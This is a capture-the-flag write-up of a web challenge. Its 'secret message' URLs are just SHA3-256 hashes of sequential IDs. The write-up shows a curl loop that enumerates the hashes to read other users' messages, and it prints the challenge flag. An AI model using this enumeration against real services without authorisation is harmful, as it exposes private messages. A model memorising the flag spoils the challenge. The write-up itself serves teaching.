# Doors Everywhere (Part III)

Category: Web

## Description

> Secret messages! Probably the most secure part of this website. There's no way to guess those URLs. ...Unless?

## Solution

The "Secret Message" service allows sending secret messages through a dedicated form:

```html
<script src="/static/js-sha3"></script>
<script language="JavaScript">
    function generateHash(messageId) {
        // Encrypt the message ID using SHA3-256.
        hashHex = sha3_256(messageId);

        // Update the Text Field
        document.getElementById("secretIdField").value = hashHex;
    }
</script>

<form action="/send" method="post">
    <label>
        To:
        <input type="text" name="username" />
    </label>
    <p>
        <label>Message:
            <textarea name="message"></textarea>
        </label>
    </p>
    <p>
        <label>Secret ID:
            <!--
    FIXME: Hack to show people what the secret ID will be after they send their message. It _usually_
            works, but sometimes it doesn't, if someone takes too long to write their message.
            The real way to fix this is to better explain that they need to actually finish writing
            their message before they can get the link.
            If they really need the link inside the message, for some reason, we should just add
            the ability to edit a message after saving it.
    -->
            <input id="secretIdField" type="text" value="Click to display" readonly
                onclick="generateHash('1233')">
        </label>
    </p>
    <p class="tooltip">
        <input id="submit" type="submit" disabled>
        <span class="tooltiptext">⚠️ Sending secret messages is disabled for guest accounts.</span>
    </p>
</form>
```

One of the news articles links to `/message/67b176705b46206614219f47a05aee7ae6a3edbe850bbbe214c536b989aea4d2`, which contains
the following message:

> Secret message example
> 
> From: admin
> 
> Our servers support sending secret messages between users.
> 
> Using state-of-the-art, SHA3-256 encryption, we ensure that only the intended recipient can ever access your messages.
> 
> Even better, because our technology is so safe, you can use it to send messages to people who don't even have accounts on the site. Simply write your message and copy the sharing link. Anyone with that can read the message, but no one would be able to guess it, even if they had a powerful supercomputer.

We know that `67b176705b46206614219f47a05aee7ae6a3edbe850bbbe214c536b989aea4d2` is a SHA3-256 digest, and while it can't be reversed directly we 
can search dedicated websites such as [hashes.link](https://hashes.link/) to see if it has precalculated the input that will have produced our
requested hash. In our case, we will discover that the input is simply "`1`":

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Doors_Everywhere_Part_III]
└─$ echo -n 1 | openssl dgst -sha3-256 -r | awk '{ printf $1 }'
67b176705b46206614219f47a05aee7ae6a3edbe850bbbe214c536b989aea4d2
```

This observation, together with the Javascript logic above, gives us a pretty good reason to believe that we might be able to read additional 
secret messages by visiting URLs based on the SHA3-256 digest of values from 1 onwards.

Let's try that:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Doors_Everywhere_Part_III]
└─$  curl -s https://secuweb-web.2024-bq.ctfcompetition.com/message/$(echo -n 2 | openssl dgst -sha3-256 -r | awk '{ printf $1 }')
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>SecuWeb: Secret Message from admin</title>
    <link rel="stylesheet" href="/static/site.css">
</head>
<body>
<div id="content">
    <h1>Are secret messages actually secret?</h1>
    <h3>From: admin</h3>
    <p>People are telling me that the "encryption" used for these is only a hash
of the post ID? Is that true? Wouldn't that make it quite easy for people
to guess post IDs and read other people's messages?
</p>
</div>
</body>
</html>
```

Looks good, let's continue in a loop searching for the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Doors_Everywhere_Part_III]
└─$ for i in {1..50}; do curl -s https://secuweb-web.2024-bq.ctfcompetition.com/message/$(echo -n $i | openssl dgst -sha3-256 -r | awk '{ printf $1 }') | grep CTF; done
    <p>The flag? It starts with "CTF". But this still isn't
CTF{H4sh1ngIsNot3ncryp7ion}
```